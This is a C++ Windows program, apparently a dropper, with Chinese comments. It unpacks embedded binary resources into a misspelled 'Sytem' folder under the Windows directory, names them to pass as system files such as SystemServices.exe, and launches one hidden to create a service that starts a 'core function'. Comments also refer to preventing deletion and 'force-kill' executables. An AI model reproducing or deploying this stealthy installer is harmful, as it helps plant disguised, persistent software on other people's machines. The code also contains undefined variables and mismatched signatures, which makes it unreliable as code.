#include <Windows.h>
#include <stdio.h>
#include <string>
#include "resource.h"
#include <string>

using namespace std;
#ifdef  UNICODE
#define  STRING wstring
#else
#define  STRING string;
#endif //  UNICODE

BOOL WriteFile64AnCreateProcess(DWORD Type, STRING StartUpFileName);
BOOL WriteFile86AnCreateProcess(DWORD Type, STRING StartUpFileName);


BOOL ReleaseFile(DWORD Type);

BOOL WriteFile64AnCreateProcess(DWORD Type)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

    TCHAR SaveTempPath[MAX_PATH * sizeof(TCHAR)] = { NULL };
    GetSystemWindowsDirectory(SaveTempPath, MAX_PATH);

#ifdef UNICODE
    wstring TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat64"));
    FILE* pFile = NULL;
    _wfopen_s(&pFile, TempFileName.c_str(), TEXT("wb+"));
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat64"));
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(TempFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
BOOL WriteFile86AnCreateProcess(DWORD Type,STRING StartUpFileName)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

#ifdef UNICODE
    
    FILE* pFile = NULL;
    _wfopen_s(&pFile, StartUpFileName.c_str(), TEXT("wb+"));
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(TEXT("Protect.dat86"));
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess(StartUpFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);


    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

BOOL ReleaseFile(DWORD Type,STRING fileName)
{
    HRSRC hrc = NULL;
    DWORD dwResourceSzie = 0;
    HGLOBAL hGlobalResource = NULL;
    hrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(Type), TEXT("BIN"));
    if (NULL == hrc)
        return 0;
    dwResourceSzie = SizeofResource(GetModuleHandle(NULL), hrc);



    hGlobalResource = LoadResource(GetModuleHandle(NULL), hrc);
    if (NULL == hGlobalResource || dwResourceSzie <= 0)
        return 0;

    LPBYTE pData = (LPBYTE)LockResource(hGlobalResource);

#ifdef UNICODE

 // UNICODE

    FILE* pFile = NULL;
    _wfopen_s(&pFile, fileName.c_str(), TEXT("wb+"));
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#else
    string TempFileName = SaveTempPath;
    TempFileName.append(fileName);
    FILE* pFile = NULL;
    fopen_s(&pFile, TempFileName.c_str(), "wb+");
    //写入到文件
    if (NULL == pFile)
        return FALSE;

    fwrite(pData, sizeof(char), dwResourceSzie, pFile);//写入到文件

    fclose(pFile);
    FreeResource(hGlobalResource);
#endif // UNICODE
    return TRUE;
}
STRING GetPath()
{
    TCHAR SaveTempPath[MAX_PATH * sizeof(TCHAR)] = { NULL };
    GetSystemWindowsDirectory(SaveTempPath, MAX_PATH);
    STRING FileName = SaveTempPath;
    
#ifdef UNICODE
    FileName.append(TEXT("\\"));
    FileName.append(TEXT("Sytem"));
    wstring TempFileName = TEXT("");
    if (NULL != CreateDirectory(FileName.c_str(), NULL))
    {
        TempFileName = FileName;
        TempFileName.append(TEXT("\\"));
        return STRING(TempFileName);
    }
    DWORD dwError = GetLastError();
    if (dwError == ERROR_ALREADY_EXISTS)
    {
         TempFileName = FileName;
        TempFileName.append(TEXT("\\"));
        return STRING(TempFileName);
    }
    return NULL;
    
#else
    FileName.append("\\");
    FileName.append("Sytem");
    string TempFileName = "";
    if (NULL != CreateDirectory(FileName.c_str(), NULL))
    {
        TempFileName = FileName;
        TempFileName.append("\\");
        return STRING(TempFileName);
    }
    DWORD dwError = GetLastError();
    if (dwError == ERROR_ALREADY_EXISTS)
    {
        TempFileName = FileName;
        TempFileName.append("\\");
        return STRING(TempFileName);
    }
    return NULL;
#endif
    
}
int main()
{
    // 防止删除
    //19_FOR_193.exe
   // WriteFile86AnCreateProcess(RRW_32);
   // WriteFile86AnCreateProcess(RRW_32);
    //1.服务加载 2.服务本身. 3.强杀exe
    
    STRING patchName = GetPath();
    patchName.append(TEXT("SystemServices.exe"));
   // ReleaseFile(BUG_20190719_FOR_193,TEXT("19_FOR_193.pro")); //写入20个强杀.
    ReleaseFile(SYSTEM_SERVICES, patchName);

    /*patchName = GetPath();
    patchName.append(TEXT("PRO86.PRO"));
    ReleaseFile(RRW_32, patchName);*/
    
    patchName = GetPath();
    patchName.append(TEXT("PRO86.PRO"));
    ReleaseFile(HANDLE_OCCFILE, patchName);
    patchName = GetPath();
    patchName.append(TEXT("CreateService"));
    WriteFile86AnCreateProcess(CREATE_SERVICE, patchName); //先启动服务.,服务来启东核心功能.
   
    return 0;
}